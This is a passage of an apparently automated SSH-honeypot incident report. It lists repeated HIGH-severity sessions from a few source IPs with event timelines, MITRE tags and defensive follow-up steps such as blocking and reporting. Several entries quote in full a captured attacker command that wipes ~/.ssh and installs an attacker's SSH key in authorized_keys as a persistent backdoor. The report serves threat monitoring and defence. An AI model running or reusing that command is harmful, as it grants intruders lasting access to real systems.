| `2026-04-20 20:13:27` | `cowrie.command.failed` |
| `2026-04-20 20:13:27` | `cowrie.log.closed` |
| `2026-04-20 20:13:27` | `cowrie.session.params` |
| `2026-04-20 20:13:27` | `cowrie.command.input` |
| `2026-04-20 20:13:28` | `cowrie.session.file_download` |
| `2026-04-20 20:13:28` | `cowrie.log.closed` |
| `2026-04-20 20:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c4ed05e9795

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:13 |
| **Last Seen** | 2026-04-20 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:13:31` | `cowrie.session.connect` |
| `2026-04-20 20:13:31` | `cowrie.client.version` |
| `2026-04-20 20:13:31` | `cowrie.client.kex` |
| `2026-04-20 20:13:32` | `cowrie.login.success` |
| `2026-04-20 20:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b093e150c8a2

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:14 |
| **Last Seen** | 2026-04-20 20:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:14:10` | `cowrie.session.connect` |
| `2026-04-20 20:14:10` | `cowrie.client.version` |
| `2026-04-20 20:14:11` | `cowrie.client.kex` |
| `2026-04-20 20:14:12` | `cowrie.login.success` |
| `2026-04-20 20:14:13` | `cowrie.session.params` |
| `2026-04-20 20:14:13` | `cowrie.command.input` |
| `2026-04-20 20:14:13` | `cowrie.command.failed` |
| `2026-04-20 20:14:13` | `cowrie.log.closed` |
| `2026-04-20 20:14:14` | `cowrie.session.params` |
| `2026-04-20 20:14:14` | `cowrie.command.input` |
| `2026-04-20 20:14:14` | `cowrie.session.file_download` |
| `2026-04-20 20:14:14` | `cowrie.log.closed` |
| `2026-04-20 20:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0334f5c4c399

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:14 |
| **Last Seen** | 2026-04-20 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:14:18` | `cowrie.session.connect` |
| `2026-04-20 20:14:18` | `cowrie.client.version` |
| `2026-04-20 20:14:19` | `cowrie.client.kex` |
| `2026-04-20 20:14:20` | `cowrie.login.success` |
| `2026-04-20 20:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2003a1c284df

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:14 |
| **Last Seen** | 2026-04-20 20:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:14:31` | `cowrie.session.connect` |
| `2026-04-20 20:14:31` | `cowrie.client.version` |
| `2026-04-20 20:14:32` | `cowrie.client.kex` |
| `2026-04-20 20:14:32` | `cowrie.login.success` |
| `2026-04-20 20:14:32` | `cowrie.session.params` |
| `2026-04-20 20:14:32` | `cowrie.command.input` |
| `2026-04-20 20:14:32` | `cowrie.command.failed` |
| `2026-04-20 20:14:32` | `cowrie.log.closed` |
| `2026-04-20 20:14:33` | `cowrie.session.params` |
| `2026-04-20 20:14:33` | `cowrie.command.input` |
| `2026-04-20 20:14:33` | `cowrie.session.file_download` |
| `2026-04-20 20:14:33` | `cowrie.log.closed` |
| `2026-04-20 20:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c915255ccc48

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:14 |
| **Last Seen** | 2026-04-20 20:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:14:35` | `cowrie.session.connect` |
| `2026-04-20 20:14:35` | `cowrie.client.version` |
| `2026-04-20 20:14:35` | `cowrie.client.kex` |
| `2026-04-20 20:14:36` | `cowrie.login.success` |
| `2026-04-20 20:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda419b50a2d

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:15 |
| **Last Seen** | 2026-04-20 20:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:15:08` | `cowrie.session.connect` |
| `2026-04-20 20:15:08` | `cowrie.client.version` |
| `2026-04-20 20:15:08` | `cowrie.client.kex` |
| `2026-04-20 20:15:09` | `cowrie.login.success` |
| `2026-04-20 20:15:10` | `cowrie.session.params` |
| `2026-04-20 20:15:10` | `cowrie.command.input` |
| `2026-04-20 20:15:10` | `cowrie.command.failed` |
| `2026-04-20 20:15:10` | `cowrie.log.closed` |
| `2026-04-20 20:15:11` | `cowrie.session.params` |
| `2026-04-20 20:15:11` | `cowrie.command.input` |
| `2026-04-20 20:15:11` | `cowrie.session.file_download` |
| `2026-04-20 20:15:11` | `cowrie.log.closed` |
| `2026-04-20 20:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34cd7c33efc3

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:15 |
| **Last Seen** | 2026-04-20 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:15:14` | `cowrie.session.connect` |
| `2026-04-20 20:15:14` | `cowrie.client.version` |
| `2026-04-20 20:15:14` | `cowrie.client.kex` |
| `2026-04-20 20:15:15` | `cowrie.login.success` |
| `2026-04-20 20:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9544eb82b79

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:15 |
| **Last Seen** | 2026-04-20 20:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:15:53` | `cowrie.session.connect` |
| `2026-04-20 20:15:53` | `cowrie.client.version` |
| `2026-04-20 20:15:53` | `cowrie.client.kex` |
| `2026-04-20 20:15:53` | `cowrie.login.success` |
| `2026-04-20 20:15:54` | `cowrie.session.params` |
| `2026-04-20 20:15:54` | `cowrie.command.input` |
| `2026-04-20 20:15:54` | `cowrie.command.failed` |
| `2026-04-20 20:15:54` | `cowrie.log.closed` |
| `2026-04-20 20:15:54` | `cowrie.session.params` |
| `2026-04-20 20:15:54` | `cowrie.command.input` |
| `2026-04-20 20:15:54` | `cowrie.session.file_download` |
| `2026-04-20 20:15:54` | `cowrie.log.closed` |
| `2026-04-20 20:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76901829ed0f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:15 |
| **Last Seen** | 2026-04-20 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:15:56` | `cowrie.session.connect` |
| `2026-04-20 20:15:56` | `cowrie.client.version` |
| `2026-04-20 20:15:56` | `cowrie.client.kex` |
| `2026-04-20 20:15:57` | `cowrie.login.success` |
| `2026-04-20 20:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a5ba88ee3e

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:15 |
| **Last Seen** | 2026-04-20 20:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:15:59` | `cowrie.session.connect` |
| `2026-04-20 20:15:59` | `cowrie.client.version` |
| `2026-04-20 20:15:59` | `cowrie.client.kex` |
| `2026-04-20 20:15:59` | `cowrie.login.success` |
| `2026-04-20 20:15:59` | `cowrie.session.params` |
| `2026-04-20 20:15:59` | `cowrie.command.input` |
| `2026-04-20 20:15:59` | `cowrie.command.failed` |
| `2026-04-20 20:16:00` | `cowrie.log.closed` |
| `2026-04-20 20:16:00` | `cowrie.session.params` |
| `2026-04-20 20:16:00` | `cowrie.command.input` |
| `2026-04-20 20:16:00` | `cowrie.session.file_download` |
| `2026-04-20 20:16:00` | `cowrie.log.closed` |
| `2026-04-20 20:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a83dee74afe

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:16 |
| **Last Seen** | 2026-04-20 20:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:16:00` | `cowrie.session.connect` |
| `2026-04-20 20:16:00` | `cowrie.client.version` |
| `2026-04-20 20:16:00` | `cowrie.client.kex` |
| `2026-04-20 20:16:02` | `cowrie.login.success` |
| `2026-04-20 20:16:02` | `cowrie.session.params` |
| `2026-04-20 20:16:02` | `cowrie.command.input` |
| `2026-04-20 20:16:02` | `cowrie.command.failed` |
| `2026-04-20 20:16:03` | `cowrie.log.closed` |
| `2026-04-20 20:16:03` | `cowrie.session.params` |
| `2026-04-20 20:16:03` | `cowrie.command.input` |
| `2026-04-20 20:16:04` | `cowrie.session.file_download` |
| `2026-04-20 20:16:04` | `cowrie.log.closed` |
| `2026-04-20 20:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7530c81cb1

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:16 |
| **Last Seen** | 2026-04-20 20:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:16:02` | `cowrie.session.connect` |
| `2026-04-20 20:16:02` | `cowrie.client.version` |
| `2026-04-20 20:16:02` | `cowrie.client.kex` |
| `2026-04-20 20:16:03` | `cowrie.login.success` |
| `2026-04-20 20:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e2bbd60008

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:16 |
| **Last Seen** | 2026-04-20 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:16:08` | `cowrie.session.connect` |
| `2026-04-20 20:16:08` | `cowrie.client.version` |
| `2026-04-20 20:16:08` | `cowrie.client.kex` |
| `2026-04-20 20:16:10` | `cowrie.login.success` |
| `2026-04-20 20:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31091493a77b

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:16 |
| **Last Seen** | 2026-04-20 20:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:16:46` | `cowrie.session.connect` |
| `2026-04-20 20:16:46` | `cowrie.client.version` |
| `2026-04-20 20:16:47` | `cowrie.client.kex` |
| `2026-04-20 20:16:48` | `cowrie.login.success` |
| `2026-04-20 20:16:48` | `cowrie.session.params` |
| `2026-04-20 20:16:48` | `cowrie.command.input` |
| `2026-04-20 20:16:48` | `cowrie.command.failed` |
| `2026-04-20 20:16:48` | `cowrie.log.closed` |
| `2026-04-20 20:16:49` | `cowrie.session.params` |
| `2026-04-20 20:16:49` | `cowrie.command.input` |
| `2026-04-20 20:16:49` | `cowrie.session.file_download` |
| `2026-04-20 20:16:49` | `cowrie.log.closed` |
| `2026-04-20 20:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e38a3d0b3af

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:16 |
| **Last Seen** | 2026-04-20 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:16:52` | `cowrie.session.connect` |
| `2026-04-20 20:16:52` | `cowrie.client.version` |
| `2026-04-20 20:16:52` | `cowrie.client.kex` |
| `2026-04-20 20:16:53` | `cowrie.login.success` |
| `2026-04-20 20:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b80b095bf5

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:17 |
| **Last Seen** | 2026-04-20 20:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:17:22` | `cowrie.session.connect` |
| `2026-04-20 20:17:22` | `cowrie.client.version` |
| `2026-04-20 20:17:22` | `cowrie.client.kex` |
| `2026-04-20 20:17:23` | `cowrie.login.success` |
| `2026-04-20 20:17:23` | `cowrie.session.params` |
| `2026-04-20 20:17:23` | `cowrie.command.input` |
| `2026-04-20 20:17:23` | `cowrie.command.failed` |
| `2026-04-20 20:17:23` | `cowrie.log.closed` |
| `2026-04-20 20:17:24` | `cowrie.session.params` |
| `2026-04-20 20:17:24` | `cowrie.command.input` |
| `2026-04-20 20:17:24` | `cowrie.session.file_download` |
| `2026-04-20 20:17:24` | `cowrie.log.closed` |
| `2026-04-20 20:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6828789e103

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:17 |
| **Last Seen** | 2026-04-20 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:17:26` | `cowrie.session.connect` |
| `2026-04-20 20:17:26` | `cowrie.client.version` |
| `2026-04-20 20:17:26` | `cowrie.client.kex` |
| `2026-04-20 20:17:26` | `cowrie.login.success` |
| `2026-04-20 20:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f629d318f96

| Field | Detail |
